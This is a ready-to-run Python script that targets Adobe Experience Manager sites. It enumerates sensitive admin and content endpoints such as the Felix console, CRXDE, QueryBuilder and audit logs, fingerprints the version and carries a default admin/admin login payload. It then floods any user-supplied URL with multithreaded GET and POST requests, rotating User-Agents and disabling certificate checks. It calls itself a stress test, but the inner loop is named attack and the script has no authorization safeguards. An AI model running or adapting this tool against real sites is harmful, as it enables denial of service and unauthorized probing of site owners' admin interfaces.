import requests
import time
import json
import random
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning
from typing import List, Dict, Optional

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class AEMTester:
    def __init__(self):
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
        ]
        
        self.headers = {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
        }
        
        # AEM-specific endpoints
        self.endpoints = [
            "/libs/granite/core/content/login.html",  # Login page
            "/crx/de/index.jsp",  # CRXDE Lite
            "/system/console",  # Felix Console
            "/crx/explorer/browser/index.jsp",  # CRX Explorer
            "/libs/cq/core/content/welcome.html",  # Welcome page
            "/aem/start.html",  # AEM Start page
            "/content.infinity.json",  # Content tree
            "/system/sling/cqform/defaultlogin.html",  # Default login
            "/etc.json",  # Configuration
            "/content/dam.json",  # Digital Asset Manager
            "/system/console/bundles",  # OSGi Bundles
            "/system/console/configMgr",  # OSGi Configurations
            "/system/console/status-productinfo",  # Product Info
            "/bin/querybuilder.json",  # QueryBuilder
            "/libs/granite/core/content/login",  # Granite UI Login
            "/apps.tidy.infinity.json",  # Apps content
            "/content/usergenerated",  # User Generated Content
            "/system/health",  # Health Check
            "/.cqactions.json",  # CQ Actions
            "/content/screens",  # AEM Screens
            "/content/communities",  # AEM Communities
            "/content/forms",  # AEM Forms
        ]

        self.payloads = {
            "auth_test": {
                "j_username": "admin",
                "j_password": "admin",
                "j_validate": "true"
            },
            "query_test": {
                "path": "/content",
                "type": "cq:Page",
                "p.limit": "1"
            }
        }

    def get_random_user_agent(self) -> str:
        return random.choice(self.user_agents)

    def verify_endpoint(self, url: str, endpoint: str) -> bool:
        """Verify if an AEM endpoint is accessible"""
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        try:
            response = requests.head(
                full_url,
                headers={"User-Agent": self.get_random_user_agent()},
                timeout=5,
                verify=False,
                allow_redirects=True
            )
            return 200 <= response.status_code < 404
        except:
            return False

    def discover_valid_endpoints(self, url: str) -> List[str]:
        """Discover valid AEM endpoints"""
        print("[INFO] Discovering valid AEM endpoints...")
        valid_endpoints = []
        
        # Add AEM-specific endpoint patterns
        additional_endpoints = [
            "/content/geometrixx",  # Sample content
            "/content/we-retail",   # Sample content
            "/system/console/jmx",  # JMX Console
            "/system/console/profiler", # Memory Profiler
            "/system/console/diskbenchmark", # Disk Benchmark
            "/libs/granite/core/content/homepage.html", # Granite homepage
            "/mnt/overlay",  # Overlays
            "/var/audit",    # Audit logs
            "/var/statistics", # Statistics
        ]
        
        self.endpoints.extend(additional_endpoints)
        
        for endpoint in self.endpoints:
            if self.verify_endpoint(url, endpoint):
                print(f"[SUCCESS] Found valid AEM endpoint: {endpoint}")
                valid_endpoints.append(endpoint)
        
        return valid_endpoints or self.endpoints

    def check_aem_version(self, url: str) -> Optional[str]:
        """Try to determine AEM version"""
        version_endpoints = [
            "/system/console/status-productinfo",
            "/system/console/bundles.json"
        ]
        
        for endpoint in version_endpoints:
            try:
                response = requests.get(
                    f"{url.rstrip('/')}/{endpoint.lstrip('/')}",
                    headers={"User-Agent": self.get_random_user_agent()},
                    verify=False,
                    timeout=5
                )
                if response.ok and "AEM" in response.text:
                    return response.text
            except:
                continue
        return None

    def send_request(self, method: str, url: str, endpoint: str, data: Dict = None) -> Optional[str]:
        full_url = f"{url.rstrip('/')}/{endpoint.lstrip('/')}"
        self.headers["User-Agent"] = self.get_random_user_agent()
        
        try:
            if method.upper() == "GET":
                response = requests.get(
                    full_url, 
                    headers=self.headers, 
                    timeout=5, 
                    verify=False,
                    allow_redirects=True
                )
            else:
                response = requests.post(
                    full_url, 
                    json=data, 
                    headers=self.headers, 
                    timeout=5, 
                    verify=False,
                    allow_redirects=True
                )
            
            print(f"[{response.status_code}] {method} {full_url}")
            return response.text if response.ok else None
            
        except RequestException as e:
            print(f"[ERROR] {method} {full_url}: {e}")
            return None

    def flood(self, url: str, workers: int = 10, duration: int = 60):
        """Execute stress test on AEM instance"""
        print(f"[INFO] Starting AEM stress test on {url} for {duration}s with {workers} workers")
        
        # Check AEM version first
        version_info = self.check_aem_version(url)
        if version_info:
            print(f"[INFO] Detected AEM instance: {version_info}")
        
        valid_endpoints = self.discover_valid_endpoints(url)
        if not valid_endpoints:
            print("[WARNING] No valid AEM endpoints found. Using default endpoints.")
            
        start_time = time.time()

        def attack():
            while time.time() - start_time < duration:
                endpoint = random.choice(self.endpoints)
                method = random.choice(["GET", "POST"])
                payload = self.payloads["query_test"] if method == "POST" else None
                
                result = self.send_request(method, url, endpoint, data=payload)
                if result:
                    time.sleep(random.uniform(0.1, 0.3))
                else:
                    time.sleep(random.uniform(0.5, 1.0))

        with ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(attack) for _ in range(workers)]
            for future in futures:
                future.result()

def main():
    target_url = input("Enter target AEM URL (e.g., https://example.com): ").strip()
    if not (target_url.startswith("http://") or target_url.startswith("https://")):
        print("[ERROR] Invalid URL. Please include http:// or https://")
        return
    
    try:
        tester = AEMTester()
        workers = int(input("Enter number of workers (default: 20): ") or "20")
        duration = int(input("Enter duration in seconds (default: 120): ") or "120")
        tester.flood(target_url, workers=workers, duration=duration)
    except KeyboardInterrupt:
        print("\n[INFO] Test interrupted by user.")
    except Exception as e:
        print(f"[ERROR] Unexpected error occurred: {e}")

if __name__ == "__main__":
    main() 